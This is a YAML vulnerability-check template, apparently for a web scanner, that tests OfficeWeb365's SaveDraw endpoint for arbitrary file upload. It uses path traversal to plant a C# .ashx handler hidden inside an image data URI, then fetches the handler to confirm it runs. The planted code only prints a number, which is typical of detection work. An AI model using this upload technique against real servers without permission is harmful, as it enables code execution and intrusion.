id: poc-yaml-officeweb365-savedraw-fileupload
info:
  name: OfficeWeb365 SaveDraw 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: officeWeb365
  fofa: officeWeb365
variables:
  r0: random_int(10,99)
  r1: random_int(40000,44800)
  r2: random_int(40000,44800)
  r3: r1 * r2
requests:
- method: POST
  path: /PW/SaveDraw?path=../../Content/img&idx={{.r0}}.ashx
  data: 'data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ Language="C#"
    Class="Handler1" %>public class Handler1:System.Web.IHttpHandler

    {

    public void ProcessRequest(System.Web.HttpContext context)

    {

    System.Web.HttpResponse response = context.Response;

    response.Write({{.r1}} * {{.r2}});

    response.Write("\nThis website has a vulnerability");

    string filePath = context.Server.MapPath("/") + context.Request.Path;

    }

    public bool IsReusable

    {

    get { return false; }

    }

    }///---

    '
  expression: 'status_code == 200

    '
- method: GET
  path: /Content/img/UserDraw/drawPW{{.r0}}.ashx
  expression: "status_code == 200 && \ncontains(body,r3) && \ncontains(body,\"This\
    \ website has a vulnerability\")\n"
transport: http
